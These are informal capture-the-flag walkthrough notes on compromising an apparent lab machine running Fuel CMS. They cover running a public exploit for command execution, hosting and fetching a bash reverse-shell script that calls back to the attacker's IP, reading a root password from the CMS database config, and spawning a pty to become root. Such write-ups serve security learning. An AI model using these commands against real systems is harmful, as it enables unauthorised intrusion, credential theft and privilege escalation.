The two # I put in are needed, also put in correct IP and delete the port number. Script is now working
run script
	Python2 fuelCMSexploit.py
cmd:whoami
www-data
start to look through the system, found robots.txt but I am not able to look at it
search for bash
	which bash
system/bin/bash
 	PENTEST MONKEY TIME
Found a rev shell but was not able to get it to talk without uploading the file
sudo python -m SimpleHTTPServer 80
now upload
	bash -i >& /dev/tcp/10.6.23.228/4444 0>&1 (obviously change your IP)
	Make sure you copy this file into the html folder (var/www/html)
Start a listener nc -lvnp 4444
now do a wget on target machine
	cmd:wget http://10.6.23.228/rev.sh  
	ls -la
	we can see that rev.sh is not executable
	chmod +x rev.sh
	bash rev.sh
Now you should have a reverse shell
	cd /home
	cd www
	cat flag.txt

Task2:

Gain root access
sudo -l
	nothing
getuid
	nothing... this is not going very well
setuid
	not installed, crap...
ok further research figured out we did not have a “real” terminal shell, run the python script o terminal shell...
and.... the machine went crazy and terminated.... this sucks, oh well, time to start over...
ok, second try and the terminal still kept going crazy, screw this real terminal thing
lets try and see if we can find anything
	I did a ls -la and found fuel
	From there I looked through the fuel folders, ultimately going to application, then to config and i found a database.php in there
	I did a cat on the database.php and was able to locate the username of root and password of mememe	
Bad news to do a sudo su we need to be in a real terminal, back to the drawing board
	Alright we found something that we can use
python -c 'import pty; pty.spawn("/bin/bash")'
	su root
	mememe
	cat /root/root.txt
